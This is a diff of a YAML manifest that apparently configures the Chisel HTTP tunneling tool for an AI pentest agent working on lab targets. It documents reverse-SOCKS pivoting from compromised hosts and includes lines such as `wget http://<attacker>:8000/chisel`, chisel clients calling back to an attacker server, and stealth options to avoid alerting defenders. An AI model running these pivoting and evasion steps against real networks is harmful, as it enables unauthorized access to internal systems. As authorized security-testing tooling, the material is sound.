@@ -1,49 +1,23 @@
 name: chisel
+kind: cli
+binary: chisel
 version: "1.11.4"
-description: "HTTP-based tunneling and SOCKS proxy via Chisel v1.11.4 (jpillora/chisel). Six methods: server (start chisel listener), client_forward (forward tunnel — access server-side services locally), client_reverse (reverse tunnel — expose client-side services on server), client_socks (SOCKS5 proxy through server's network), list (show active tunnels), close (terminate a process). Tunnels over HTTP/WebSocket with mandatory SSH encryption, traverses proxies and firewalls that block raw SSH. Single Go binary, no dependencies. Server and client run as long-lived background processes tracked in-memory by PID. Supports authentication (--auth user:pass), TLS, server fingerprint verification, and backend HTTP proxying to hide chisel behind legitimate web servers. Client auto-reconnects with exponential backoff (100ms to 5min). For SSH-based tunneling when SSH is available, use the tunnel tool instead — chisel is for when SSH ports are blocked but HTTP/HTTPS is open."
+description: "HTTP-based tunneling and SOCKS5 proxy via Chisel v1.11.4 (jpillora/chisel) — single Go binary, two subcommands (server, client). Used for engagement-lifetime tunnels when SSH is blocked but HTTP/HTTPS is open: agent runs chisel server in a persistent kind:cli container, target downloads + runs chisel client connecting back to the server with R:<port>:socks reverse-SOCKS spec. The server's fingerprint (base64 SHA256 of ECDSA public key) appears in stderr at startup and goes to the client's --fingerprint flag for MITM protection. Per-engagement use is single-server (1 container holds for max_runtime_seconds) — for SSH-based tunneling prefer the `ssh` (kind:cli v3.0) ControlMaster + tunnel-flag patterns since they don't require a server-side process on the agent."
 image: "ghcr.io/silicon-works/mcp-tools-chisel:latest"
-image_size_mb: 195
-timeout_seconds: 600
-service: true
-service_name: "chisel"
+image_size_mb: 205
+
+# Engagement-lifetime tunnel — chisel server holds for hours.
+idle_timeout_seconds: 600
+max_runtime_seconds: 86400
+timeout_seconds: 86400
 
 capabilities:
   - http_tunneling
   - port_forwarding
   - reverse_tunneling
-  - socks_proxy
+  - socks5_proxy
   - pivoting
-  - tunnel_management
-
-routing:
-  use_for:
-    - "create HTTP-based tunnel when SSH port is blocked but HTTP/HTTPS is open"
-    - "set up forward port forwarding through chisel to access internal services"
-    - "create reverse tunnel to expose a compromised host's service on the attacker machine"
-    - "establish SOCKS5 proxy through chisel for pivoting into internal networks via HTTP"
-    - "tunnel through web proxies and firewalls that only allow HTTP/HTTPS traffic"
-    - "set up a chisel server with --reverse to receive reverse shells tunneled over HTTP"
-    - "access localhost-only services on a remote host by forwarding ports through chisel"
-    - "create an HTTP tunnel that looks like normal web traffic to evade network detection"
-    - "pivot through a compromised host to reach internal network segments via HTTP tunnel"
-    - "hide chisel traffic behind a legitimate website using --backend reverse proxy"
-  never_use_for:
-    - "SSH tunneling when SSH is available (use tunnel — SSH is simpler and doesn't need a server component)"
-    - "port scanning through a tunnel (use nmap with proxychains after establishing SOCKS)"
-    - "file transfer (use ssh copy_to/copy_from or curl)"
-    - "reverse shell listeners (use netcat — chisel is for tunneling, not shell handling)"
-    - "IPsec VPN connections (use ike-scan for VPN discovery) — chisel is per-port tunneling, not full network VPN"
-  triggers:
-    - "chisel"
-    - "HTTP tunnel"
-    - "HTTPS tunnel"
-    - "WebSocket tunnel"
-    - "reverse tunnel HTTP"
-    - "SOCKS over HTTP"
-    - "firewall bypass tunnel"
-    - "pivot HTTP"
-    - "chisel server"
-    - "chisel client"
+  - tls_tunneling
 
 phases:
   - post-exploitation
@@ -56,225 +30,168 @@ resources:
   memory_mb: 128
   cpu: 0.25
 
+routing:
+  use_for:
+    - "create HTTP-based tunnel when SSH port is blocked but HTTP/HTTPS is open"
+    - "establish SOCKS5 proxy through compromised host for pivoting into internal networks via HTTP"
+    - "tunnel through web proxies and firewalls that only allow HTTP/HTTPS"
+    - "set up a chisel server with --reverse to receive reverse-shell-style tunnels from a compromised target"
+    - "pivot through a compromised host to reach internal network segments via HTTP tunnel"
+    - "hide chisel traffic behind a legitimate website using --backend reverse proxy"
+    - "run chisel client (agent-side) to connect to a known chisel server elsewhere for forward / SOCKS tunneling"
+  never_use_for:
+    - "SSH tunneling when SSH is available — use the `ssh` tool's ControlMaster + tunnel-flag patterns (no server process needed)"
+    - "port scanning through a tunnel (use nmap with proxychains after SOCKS is established)"
+    - "file transfer (use scp via ssh ControlMaster, or curl via tunnel)"
+    - "reverse shell listeners (use `nc` v2.0 held-listener pipeline pattern)"
+    - "IPsec VPN connections (use ike-scan for VPN discovery first; chisel is per-port tunneling)"
+  triggers:
+    - "chisel"
+    - "HTTP tunnel"
+    - "HTTPS tunnel"
+    - "WebSocket tunnel"
+    - "reverse tunnel HTTP"
+    - "SOCKS over HTTP"
+    - "firewall bypass tunnel"
+    - "pivot HTTP"
+    - "chisel server"
+    - "chisel client"
+  prefer_over: []
+
 see_also:
   - tool: ssh
-    reason: "Use `ssh` (kind:cli v3.0, May 2026) for SSH-based tunneling when SSH is available — its ControlMaster + tunnel-flag patterns (-L forward, -D SOCKS, -R reverse) cover everything the legacy `tunnel` (kind:mcp) tool did, and don't require a server component on the agent side. The legacy `tunnel` tool was retired May 2026; SSH-based tunneling lives in `ssh` now. Use chisel only when SSH is blocked / unavailable and HTTP is open."
+    reason: "Prefer `ssh` (kind:cli v3.0) ControlMaster + tunnel-flag patterns (-L / -D / -R) when SSH is available. chisel has the added cost of needing a server process on the agent + client binary on the target — only worth that overhead when SSH is blocked. The legacy `tunnel` (kind:mcp) tool was retired May 2026; SSH-based tunneling lives in ssh now."
   - tool: nc
-    reason: "Use for raw reverse shell listeners (held-listener pipeline pattern), then tunnel the shell through chisel if needed. The legacy `netcat` (kind:mcp) tool was consolidated into `nc` (kind:cli v2.0, May 2026); search for either name in the registry."
+    reason: "Use `nc` v2.0 for raw reverse shell listeners (held-listener pipeline pattern); chisel is for tunneling, NOT shell holding. Once a foothold yields a reverse shell on nc, agent can upload chisel binary via the held shell, then run `chisel client http://attacker:port R:1080:socks` from inside the target shell."
   - tool: nmap
-    reason: "After establishing a chisel SOCKS proxy, use nmap with proxychains to scan internal networks"
+    reason: "After establishing a chisel SOCKS proxy at localhost:1080, scan internal hosts via `proxychains -f /tmp/pc.conf nmap ...` with pc.conf containing `socks5 127.0.0.1 1080`."
+  - tool: curl
+    reason: "Once SOCKS is up, curl --socks5 127.0.0.1:1080 https://internal/ reaches internal services through the tunnel — verified empirically 2026-05-10."
 
-methods:
+target_extraction: []
+reject_flags: []
+reject_flags_reason: "chisel server takes no remote-target arg (it's a local listener). chisel client takes a server URL — that's the only target-shaped argument. No reject_flags apply."
+
+usage_patterns:
+
+  - name: "Pattern C1 — chisel server (engagement-lifetime SOCKS/reverse listener)"
+    binary: "bash"
+    command: "-c 'mkdir -p /session/output/chisel && chisel server --reverse --socks5 --host 0.0.0.0 --port <port> 2>&1 | tee /session/output/chisel/server-<port>.log'"
+    when: "Start a chisel server that listens for client connections over HTTP/WebSocket. Defaults enable --reverse (allow target to push reverse tunnels back) and --socks5 (allow target to expose SOCKS5 endpoint). The `2>&1 | tee` captures both stdout AND stderr (chisel writes the Fingerprint to stderr) to /session/output/chisel/server-<port>.log so a separate tool-runner spawn can extract the fingerprint via `grep -oE 'Fingerprint [a-zA-Z0-9/+=]+' /session/output/chisel/server-<port>.log | awk '{print $2}'`. Container holds for max_runtime_seconds (24h default). Plugin defaults to --network=host so the chisel port (8080 etc.) is reachable from tun0 / target's network. Verified empirically 2026-05-10: fingerprint emitted within <2s of startup, length 44 (base64-encoded SHA256)."
+
+  - name: "Pattern C2 — extract fingerprint from server log (for client --fingerprint)"
+    binary: "bash"
+    command: "-c 'grep -oE \"Fingerprint [a-zA-Z0-9/+=]+\" /session/output/chisel/server-<port>.log | head -1 | awk \"{print \\$2}\"'"
+    when: "After Pattern C1 has started, extract the server's ECDSA public-key fingerprint (44 chars base64) from the log. The output is the value the agent passes to the target's chisel client invocation as `--fingerprint <value>` for MITM protection. The fingerprint stays stable for the server's lifetime — capture once on startup, reuse for any client connections to this same server. Returns empty if server hasn't started yet (race) — Pattern C1's sleep+grep loop avoids this."
+
+  - name: "Pattern C3 — chisel client (agent-side, connect to remote chisel server)"
+    binary: "bash"
+    command: "-c 'mkdir -p /session/output/chisel && chisel client --fingerprint <server_fingerprint> http://<server_host>:<server_port> <remote_spec> 2>&1 | tee /session/output/chisel/client-<id>.log'"
+    when: "Run the AGENT as a chisel client connecting to a known chisel server elsewhere. <remote_spec> is one of: (a) `<local-port>` for forward (server-side->local), (b) `R:<remote-port>:<host>:<port>` for reverse, (c) `<local-port>:socks` for SOCKS through the server. Less common than C1 since HTB-style flows usually run server agent-side + client on the target. <id> is something like 'forward-9999' or 'socks-1080' so the log filename is unique. Auto-reconnect built into chisel."
+
+  - name: "Pattern C4 — time-bounded chisel server (early termination via timeout prefix)"
+    binary: "bash"
+    command: "-c 'mkdir -p /session/output/chisel && timeout <seconds> chisel server --reverse --socks5 --host 0.0.0.0 --port <port> 2>&1 | tee /session/output/chisel/server-<port>.log; echo \"chisel exited after <seconds>s\" >> /session/output/chisel/server-<port>.log'"
+    when: "Cap the chisel server's lifetime to <seconds> (e.g. 3600 for a 1h window). Useful when an engagement phase wraps up earlier than max_runtime_seconds (24h). The `timeout` coreutil sends SIGTERM after <seconds>s — chisel exits cleanly + the container terminates. For server-stays-up-forever flow, omit this pattern and use C1 (max_runtime_seconds is the kill switch). NOTE: there is NO 'docker kill' style early-close path from within cli_in_container — the chisel image has no docker CLI, and even with it there's no socket access. The two real close mechanisms are: (1) this `timeout` prefix at spawn, (2) max_runtime_seconds cap. Replaces the legacy wrapper's `close <id>` and `force_restart` methods."
+
+  - name: "Pattern C5 — list active chisel processes via filesystem"
+    binary: "bash"
+    command: "-c 'ls -la /session/output/chisel/ 2>/dev/null'"
+    when: "Enumerate active chisel processes by their log files. Each Pattern C1 / C3 invocation writes server-<port>.log or client-<id>.log to /session/output/chisel/. Empty / missing dir = no active processes. Replaces the legacy wrapper's `list` method. Filesystem-tracked, no in-memory dict — agent reads it on-demand from any tool-runner spawn."
+
+  - name: "Pattern C6 — chisel server with persistent ECDSA key (stable fingerprint across restarts)"
+    binary: "bash"
+    command: "-c 'mkdir -p /session/output/chisel && chisel server --reverse --socks5 --keyfile /session/output/chisel/server.key --port <port> 2>&1 | tee /session/output/chisel/server-<port>.log'"
+    when: "Use --keyfile to load a persistent ECDSA private key so the server's fingerprint is stable across container restarts (instead of being regenerated each startup). Agent pre-generates the key via `chisel server --keygen /session/output/chisel/server.key` ONCE (single short-running call, server exits after keygen). Then C6 starts the server with --keyfile. NOTE: this is about KEY PERSISTENCE for fingerprint stability, NOT TLS-on-the-wire — chisel's WebSocket transport with --keyfile is still over plain HTTP. For HTTPS-wrapped chisel (TLS-on-the-wire), use a separate spawn with `--tls-cert /session/output/chisel/cert.pem --tls-key /session/output/chisel/key.pem` (caller pre-generates cert+key with openssl); these wrap the outer transport in HTTPS. The two features are independent: --keyfile gives stable fingerprint; --tls-cert/--tls-key give TLS transport."
+
+output_formats:
+  - flag: ""
+    format: "text"
+    preferred: true
+    notes: "chisel writes all output to stderr (server startup, client connections, errors). Recipe pipes 2>&1 | tee to /session/output/chisel/<id>.log for downstream parsing. Fingerprint line shape: `<timestamp> server: Fingerprint <base64-44-chars>`."
+
+common_options:
   server:
-    description: "Start a chisel server that listens for client connections over HTTP/WebSocket. Runs `chisel server --host <host> --port <port>` as a background process. The server accepts chisel client connections and multiplexes SSH-encrypted tunnels over the HTTP transport. By default enables --reverse (allow reverse tunnels) and --socks5 (allow SOCKS proxy) for maximum flexibility. Optional --auth enforces username:password authentication. Optional --backend proxies non-chisel HTTP requests to a real web server, making the chisel server appear as a normal website. The server prints its SSH fingerprint on startup — share this with clients for MITM detection. Runs indefinitely until closed via the close method."
-    when_to_use: "(1) First step before any chisel client connection — start the server on the attacker machine. (2) With --reverse enabled to receive reverse tunnels from compromised hosts. (3) With --socks5 to allow clients to create SOCKS proxies for pivoting. (4) With --backend to hide chisel behind a legitimate website on an engagement. (5) With --auth when multiple operators share the same chisel server. (6) On a VPS or redirector that has HTTP/HTTPS open when the target network blocks SSH."
-    required_ports: []
-    params:
-      port:
-        type: integer
-        default: 8080
-        description: "HTTP listening port. Use 80 or 443 to blend with normal web traffic."
-      host:
-        type: string
-        default: "0.0.0.0"
-        description: "Network interface to bind to. Default: all interfaces."
-      reverse:
-        type: boolean
-        default: true
-        description: "Allow clients to use reverse port forwarding (R: prefix remotes)."
-      socks5:
-        type: boolean
-        default: true
-        description: "Enable internal SOCKS5 proxy for clients."
-      auth:
-        type: string
-        description: "Authentication in 'user:pass' format. Clients must match."
-      backend:
-        type: string
-        description: "URL to proxy non-chisel requests to (e.g., 'http://example.com'). Hides chisel behind a real website."
-      verbose:
-        type: boolean
-        default: false
-        description: "Enable verbose logging."
-    returns:
-      id:
-        type: string
-        description: "Server process ID for list and close."
-      port:
-        type: integer
-        description: "Port the server is listening on."
-      fingerprint:
-        type: string
-        description: "SSH public key fingerprint (base64 SHA256). Share with clients for --fingerprint verification."
-      status:
-        type: string
-        description: "Process status (running/exited)."
+    - "--port, -p PORT: HTTP listening port (default 8080). Use 80 or 443 to blend with normal web traffic."
+    - "--host HOST: bind interface (default 0.0.0.0)"
+    - "--reverse: allow clients to use R: reverse port forwarding (recommended ON for HTB pivoting)"
+    - "--socks5: enable internal SOCKS5 proxy for clients (recommended ON for pivoting)"
+    - "--auth user:pass: enforce single-user authentication"
+    - "--authfile PATH: multi-user authentication via JSON file (object keyed by user:pass with per-user remote-address regex allowlists; auto-reloads on change). Use for multi-operator engagements where each operator gets restricted tunnel destinations."
+    - "--keepalive 25s: HTTP keepalive interval. Default 25s. Critical when traversing corporate HTTP proxies that close idle connections — set to 5s-15s for aggressive proxies, 0s disables. Both sides should match."
+    - "--backend URL: proxy non-chisel HTTP requests to a real backend (hides chisel behind a legitimate website)"
+    - "--keygen PATH: write a new ECDSA private key to PATH (run once, then reuse with --keyfile)"
+    - "--keyfile PATH: use a persistent ECDSA key — fingerprint stays stable across restarts"
+    - "--tls-cert PATH, --tls-key PATH: wrap chisel in HTTPS (need separate cert+key generated via openssl). Both required together; cannot combine with --tls-domain."
+    - "--tls-domain DOMAIN: LetsEncrypt auto-cert path. Requires port 443 + a real public domain pointed at the agent. Resulting certs cached at $HOME/.cache/chisel (or CHISEL_LE_CACHE env). Stealth deployments where chisel poses as a legitimate HTTPS service."
+    - "--tls-ca PATH: PEM CA bundle to validate client TLS certs (mutual TLS server side). Pair with client's --tls-cert/--tls-key for mTLS authentication."
+    - "-v: verbose logging"
+  client:
+    - "--fingerprint FP: required for MITM protection — pass server's fingerprint from Pattern C2"
+    - "--auth user:pass: match server's --auth (or one of server's --authfile entries)"
+    - "--header NAME: VALUE: custom HTTP header (e.g. for CDN bypass). Repeatable."
+    - "--hostname HOST: override the HTTP Host header (defaults to URL host). Different from --header — sets the bare Host, useful for vhost-routed CDNs."
+    - "--sni HOST: override TLS ServerName Indication (defaults to URL hostname). Useful for fronting via CDN edges that route by SNI."
+    - "--proxy URL: route client traffic through an HTTP CONNECT or SOCKS5 proxy to reach the chisel server (e.g. http://user:pass@proxy:8081 or socks://user:pass@proxy:1080)"
+    - "--keepalive 25s: HTTP keepalive interval. Default 25s. Match server's setting."
+    - "--max-retry-count N: cap retries (chisel default unlimited — set explicitly for fail-fast scenarios). 0 disables retries."
+    - "--max-retry-interval DURATION: cap reconnect backoff. Default 5m. Lower (e.g. 30s) for engagements where slow reconnects mask outages."
+    - "--tls-ca PATH: trust this CA bundle instead of system roots when connecting via https/wss. Pair with server using LE staging or private CA."
+    - "--tls-skip-verify: accept any TLS cert (chain + hostname). For lab/HTB self-signed certs. Does NOT bypass --fingerprint check on the inner connection — keep fingerprint validation even with skip-verify."
+    - "--tls-cert PATH, --tls-key PATH: client cert + key for mutual-TLS authentication (pair with server's --tls-ca)."
+    - "-v: verbose logging"
+    - "remote spec FORWARD: <lport>:<rhost>:<rport>/tcp|udp (default tcp). Examples: `3000:google.com:80`, `192.168.0.5:3000:internal.lan:80`, `5353:1.1.1.1:53/udp` (DNS over UDP via tunnel)."
+    - "remote spec REVERSE (server listens, forwards to client): R:<rport>:<lhost>:<lport>. Server must have --reverse. Example: R:2222:localhost:22 (expose client's SSH on server:2222)."
+    - "remote spec SOCKS through server: `<lport>:socks` (default 1080:socks). Server must have --socks5. Local port becomes SOCKS5 entry, server's network becomes SOCKS exit."
+    - "remote spec REVERSE SOCKS (canonical HTB pivot): R:<rport>:socks (e.g. R:1080:socks). Server-side port becomes SOCKS5 entry, client's network (= compromised target's reachable subnet) becomes the SOCKS exit. Most common pattern for proxychains pivoting."
+    - "remote spec STDIO mode (single connection, no port binding): stdio:<rhost>:<rport>. Connects this chisel client's stdin/stdout to the remote address. Designed for `ssh -o ProxyCommand='chisel client http://server stdio:%h:%p'` chained-pivot flows where you want one SSH connection through chisel without exposing a local port."
 
-  client_forward:
-    description: "Create a forward tunnel — the chisel client listens on a local port and forwards traffic through the chisel server to a remote host:port. Runs `chisel client <server_url> <local_port>:<remote_host>:<remote_port>` as a background process. Traffic flow: local_port → chisel client → HTTP/WebSocket → chisel server → remote_host:remote_port. The remote_host is resolved from the server's network perspective, so '127.0.0.1' means the server's localhost and internal IPs are reachable if the server can reach them. Auto-assigns local_port if set to 0. Client auto-reconnects with exponential backoff on disconnection. Note: chisel's --proxy flag (route client traffic through an HTTP CONNECT proxy to reach the chisel server) is not exposed — use bash for proxy-chained scenarios."
-    when_to_use: "(1) To access a service on the chisel server's localhost (e.g., MySQL 3306, web app 8080) from the attacker machine. (2) To reach internal network services that the chisel server can access but the attacker cannot directly. (3) When SSH port forwarding is blocked but HTTP is open. (4) After running 'server' method — connect a forward tunnel to it. (5) Use local_port=0 for auto-assignment when the specific port doesn't matter."
-    required_ports: []
-    params:
-      server_url:
-        type: string
-        required: true
-        description: "Chisel server URL (e.g., 'http://10.10.16.24:8080'). Must be a running chisel server."
-      local_port:
-        type: integer
-        default: 0
-        description: "Local port to listen on (0 = auto-assign)."
-      remote_host:
-        type: string
-        default: "127.0.0.1"
-        description: "Remote host from server's perspective. '127.0.0.1' = server localhost. Set to internal IP for pivoting."
-      remote_port:
-        type: integer
-        required: true
-        description: "Remote port to forward to."
-      auth:
-        type: string
-        description: "Auth 'user:pass' matching server."
-      fingerprint:
-        type: string
-        description: "Server fingerprint for MITM verification."
-      max_retry_count:
-        type: integer
-        default: 3
-        description: "Max reconnection attempts. Chisel's default is unlimited retries, but this is capped to 3 to prevent infinite hangs in MCP context. Set to 0 for unlimited."
-      verbose:
-        type: boolean
-        default: false
-        description: "Verbose logging."
-    returns:
-      id:
-        type: string
-        description: "Tunnel ID for list and close."
-      local_port:
-        type: integer
-        description: "Local port the tunnel listens on."
-      connect_to:
-        type: string
-        description: "Address to connect to (e.g., '127.0.0.1:9999')."
-      mapping:
-        type: string
-        description: "Chisel remote spec (e.g., '9999:127.0.0.1:3306')."
+gotchas:
+  - "ENGAGEMENT-LIFETIME DAEMON (not time-bounded). chisel server runs FOREVER — max_runtime_seconds is the cli_in_container kill switch (default 24h). For shorter sessions, prefix with `timeout NN`. Unlike responder (always wrapped with timeout for capture window), chisel typically runs the full engagement duration so the default max_runtime is appropriate."
+  - "FINGERPRINT EXTRACTION: chisel server emits 'Fingerprint <base64-44>' on stderr at startup (within ~2s). Recipe captures via `2>&1 | tee /session/output/chisel/server-<port>.log` so a separate tool-runner spawn can grep it later. Grep recipe: `grep -oE 'Fingerprint [a-zA-Z0-9/+=]+' /session/output/chisel/server-<port>.log | head -1 | awk '{print $2}'`. The fingerprint contains base64 chars including `/`, `+`, `=` — use [a-zA-Z0-9/+=]+ in regex, NOT [a-zA-Z0-9:]+ (the latter cuts at `/`)."
+  - "FINGERPRINT REGENERATION: by default chisel server generates a NEW ECDSA key each startup, so fingerprint CHANGES between restarts. For stable fingerprint across restarts (when target's chisel client has a hardcoded --fingerprint), pre-generate via `chisel server --keygen /session/output/chisel/server.key` ONCE, then run subsequent servers with `--keyfile /session/output/chisel/server.key` (Pattern C6). The keygen call short-exits — does NOT start a server. Useful when the engagement spans multiple agent sessions / container restarts."
+  - "AGENT-SIDE vs TARGET-SIDE chisel — HTB typical: agent runs SERVER (Pattern C1) in a persistent kind:cli container; agent uploads chisel binary to compromised target via existing reverse shell (nc held-listener) or scp (ssh ControlMaster); target's shell runs `chisel client http://<attacker>:8080 R:1080:socks --fingerprint <fp>` from inside the held shell — this is NOT a cli_in_container invocation, it's a command sent into the target's shell. The R:1080:socks pattern exposes the target's network as a SOCKS proxy on attacker's localhost:1080."
+  - "DOWNLOAD CHISEL TO TARGET: target needs the chisel binary. Three common flows: (1) `wget http://<attacker>:8000/chisel` if agent serves it via `python3 -m http.server` (use the `nc` tool's http-file-server usage_pattern), (2) `scp` via ssh ControlMaster if SSH is available, (3) base64-encoded write through the held shell if file transfer paths are blocked. The agent's own chisel binary is at /usr/local/bin/chisel inside the chisel container — copy it out to /session/output/chisel/chisel-bin first via `cp /usr/local/bin/chisel /session/output/chisel/chisel-bin` to make it available for upload."
+  - "PORT REACHABILITY across containers: plugin defaults to --network=host (manager.ts:382) so chisel server's port (e.g. 18080) is reachable from sibling tool-runner spawn containers as `127.0.0.1:18080`. Verified empirically 2026-05-10 — separate container's curl --socks5 127.0.0.1:11080 fetched example.com via the tunnel correctly. NO cross-container port mapping needed; --network=host handles it."
+  - "SOCKS REACHABILITY for proxychains: once Pattern C1 server + target-side client are running with R:1080:socks remote spec, the agent's tools (nmap, curl, sqlmap, ssh) can use proxychains to route through the tunnel. proxychains config: `socks5 127.0.0.1 1080` (server's R: rebound the target-side SOCKS to attacker's 1080). Verify connectivity with `nc -zv 127.0.0.1 1080` from a sibling spawn before relying on the route."
+  - "CLOSE / EARLY-TERMINATE A CHISEL SERVER: there is NO `docker kill` path available from inside cli_in_container — the chisel image has no docker CLI, and even if it did there's no socket access. Two real close mechanisms: (1) Pattern C4 — prefix spawn with `timeout <seconds>` for a fixed window; (2) wait for max_runtime_seconds (24h default) to expire. Both replace the legacy wrapper's `close` and `force_restart` methods. When the chisel server exits (either path), any clients connecting through it auto-retry via chisel's exponential backoff until they give up (~5min)."
+  - "LIST ACTIVE PROCESSES: `ls /session/output/chisel/` shows log files (server-<port>.log + client-<id>.log) for each spawn. Each Pattern C1 / C3 invocation persists its log file. Replaces the legacy wrapper's `list` method — filesystem-tracked instead of in-memory dict, so any sibling spawn can enumerate."
+  - "DON'T CONFUSE WITH ssh TUNNEL: when SSH is available, ssh kind:cli v3.0 Patterns T1/T2/T3 (-L/-D/-R via ControlMaster) are the right tool — no server-side process needed, faster setup, more reliable on modern targets. Only use chisel when port 22 is blocked outbound from the target / inbound to attacker but HTTP is open. The legacy `tunnel` (kind:mcp) tool was retired May 2026 — all SSH-tunneling absorbed into ssh."
+  - "RECONNECT BEHAVIOR (built-in): chisel client auto-reconnects with exponential backoff (100ms→5min). If the server container dies + restarts, the client picks up automatically (within minutes). BUT: if the server's --keyfile is NOT persistent, the fingerprint CHANGES on restart and the client rejects the new server (fingerprint mismatch). For stable reconnect across restarts, ALWAYS use --keyfile per gotcha #3."
+  - "BACKEND PROXY (--backend) HIDES CHISEL: useful for engagements where a tunnel exposed on port 80 would tip off defenders. `chisel server --backend http://example.com:80` proxies non-chisel HTTP requests to example.com — any web crawler hitting the chisel port sees a normal site. The chisel WebSocket upgrade path is the only entry. Increases stealth but adds latency."
+  - "TARGET ARCHITECTURE: image ships chisel for linux_amd64 only (at /usr/local/bin/chisel). 32-bit targets need chisel_<ver>_linux_386 (verified live 2026-05-11 on HTB Lame i686 — upload of amd64 binary failed with 'cannot execute binary file'). ARM targets need linux_arm64 or linux_arm. Agent detects target arch via `uname -m` from the target's held shell, then downloads the right binary from `https://github.com/jpillora/chisel/releases/download/v1.11.4/chisel_1.11.4_linux_<arch>.gz` (use the `nc` HTTP file server pattern to host it OR scp via ssh ControlMaster)."
+  - "TARGET KERNEL VERSION: chisel is built with modern Go (1.25+) which requires Linux kernel ≥ 2.6.32 (~2009). Targets older than that (Ubuntu 8.04 LTS / RHEL 5 era / Lame's 2.6.24) crash on goroutine setup with `golang.org/x/sync/errgroup.(*Group).Go` stack trace. Verified failure mode on HTB Lame 2026-05-11. Modern engagement targets (any 2010+ Linux) are unaffected. For Lame-class ancient targets, fall back to ssh tunnel patterns (ssh kind:cli v3.0 -L/-D/-R) or static-Go chisel built for older kernels (out of scope here)."
+  - "STALE LOG FILES (filesystem-state caveat): /session/output/chisel/server-<port>.log persists forever in the bind-mount even after the chisel server exits — there's no auto-prune (the legacy wrapper's `list` method did this in-memory). Pattern C5's `ls` shows historical AND current spawns. To know if a tunnel is ACTUALLY alive, probe it from a sibling spawn: `nc -zv 127.0.0.1 <port>` (using --network=host). Stale log + dead port = the chisel process has exited (max_runtime hit, network drop, kill). The log's last line often reveals why: `Listening on...` then EOF means clean exit; stack trace means crash."
+  - "NO AUTO-PICK FREE LOCAL PORT: legacy wrapper accepted local_port=0 to auto-pick; kind:cli doesn't. Agent must pick a port at spawn time (recommend 18080+ for server, 11080+ for SOCKS local-end to avoid colliding with common services). If collision: bind fails with `address already in use`; agent retries with N+1. Documented in failure_signatures."
+  - "PROCESS SIGNALS (SIGUSR2 + SIGHUP): chisel listens for SIGUSR2 (print process stats to stderr — appears in /session/output/chisel/<id>.log within seconds) and SIGHUP (short-circuit the reconnect timer — force immediate reconnect on a client, useful when waiting out the 5min max-retry-interval backoff after a network blip). Trigger from a sibling spawn that joins the SAME container's PID namespace — NOT available across cli_in_container spawns since each is its own container. Workaround: signal via `docker kill -s SIGHUP <container-name>` from outside (requires host-level docker access, not from inside cli_in_container)."
 
-  client_reverse:
-    description: "Create a reverse tunnel — the chisel SERVER listens on a port and forwards incoming traffic through the tunnel to the CLIENT's local service. Runs `chisel client <server_url> R:<remote_port>:<local_host>:<local_port>` as a background process. Traffic flow: server:remote_port → HTTP/WebSocket → chisel client → local_host:local_port. The chisel server must have --reverse enabled. Useful for exposing a compromised host's local service back to the attacker through HTTP. Note: chisel's --proxy flag (route client traffic through an HTTP CONNECT proxy to reach the chisel server) is not exposed — use bash for proxy-chained scenarios."
-    when_to_use: "(1) To expose a service running on the compromised host (e.g., a reverse shell listener) back to the attacker via the chisel server. (2) When the compromised host can reach the chisel server over HTTP but the attacker can't reach the compromised host directly. (3) For callback channels that traverse firewalls — outbound HTTP from target → chisel server → reverse tunnel back to target's local service. (4) Use with R:2222:localhost:22 to get SSH access to a host that only has outbound HTTP."
-    required_ports: []
-    params:
-      server_url:
-        type: string
-        required: true
-        description: "Chisel server URL. Server must have --reverse enabled."
-      remote_port:
-        type: integer
-        required: true
-        description: "Port the SERVER will listen on. Incoming connections here are tunneled to the client."
-      local_host:
-        type: string
-        default: "127.0.0.1"
-        description: "Local host to forward to (client-side). Default: client's localhost."
-      local_port:
-        type: integer
-        required: true
-        description: "Local port on the client side. Traffic from server:remote_port reaches this port."
-      auth:
-        type: string
-        description: "Auth 'user:pass' matching server."
-      fingerprint:
-        type: string
-        description: "Server fingerprint."
-      max_retry_count:
-        type: integer
-        default: 3
-        description: "Max reconnection attempts. Chisel's default is unlimited retries, but this is capped to 3 to prevent infinite hangs in MCP context. Set to 0 for unlimited."
-      verbose:
-        type: boolean
-        default: false
-        description: "Verbose logging."
-    returns:
-      id:
-        type: string
-        description: "Tunnel ID."
-      remote_port:
-        type: integer
-        description: "Port the server is listening on."
-      server_listens_on:
-        type: string
-        description: "Server-side listener address (e.g., '0.0.0.0:2222')."
-      mapping:
-        type: string
-        description: "Chisel remote spec (e.g., 'R:2222:127.0.0.1:22')."
+failure_signatures:
+  - signal: "bind: address already in use"
+    layer: "tcp"
+    remediation: "Another process (likely a previous chisel server, or a host service since --network=host shares the agent's net stack) is bound to the port. Easiest fix: pick a different port (chisel server --port N+1). To clear a stale chisel server, wait for its max_runtime_seconds to expire (24h default), or re-spawn with Pattern C4's `timeout <seconds>` prefix so the next one self-terminates."
+  - signal: "Fingerprint mismatch"
+    layer: "auth"
+    remediation: "Client's --fingerprint doesn't match the server's current fingerprint. Either: (a) server restarted without --keyfile and regenerated its key — re-extract fingerprint via Pattern C2 and update client; (b) man-in-the-middle (rare on lab/HTB) — re-check the chain. Use Pattern C6 (--keyfile persistence) to prevent re-key on restart."
+  - signal: "connection refused"
+    layer: "tcp"
+    remediation: "Client can't reach server. Check: (1) server actually running (`ls /session/output/chisel/server-<port>.log` shows recent activity), (2) target host's outbound HTTP not blocked, (3) attacker's <port> actually exposed externally (in HTB / tun0 context this is the user's tun0 IP, not 127.0.0.1)."
+  - signal: "tls: failed to verify certificate"
+    layer: "tls"
+    remediation: "When using --tls-cert / --tls-key on server, client needs to trust the cert. Two options: (a) `--tls-ca <ca-bundle.pem>` to pin a specific CA (production-grade); (b) `--tls-skip-verify` to accept ANY TLS cert chain (lab/HTB self-signed, still validates --fingerprint on the inner connection). Flag is `--tls-ca` NOT `--ca-cert` (verified against chisel v1.11.4 client --help)."
+  - signal: "EOF on tunnel"
+    layer: "transport"
+    remediation: "Server died or network dropped. chisel client auto-retries with exponential backoff — wait up to 5min. To verify server status from a sibling cli_in_container spawn: `ls -la /session/output/chisel/server-<port>.log` for recent activity, or `nc -zv 127.0.0.1 <port>` to probe the listener (use --network=host). Restart server with Pattern C1 + re-extract fingerprint via Pattern C2 if needed."
 
-  client_socks:
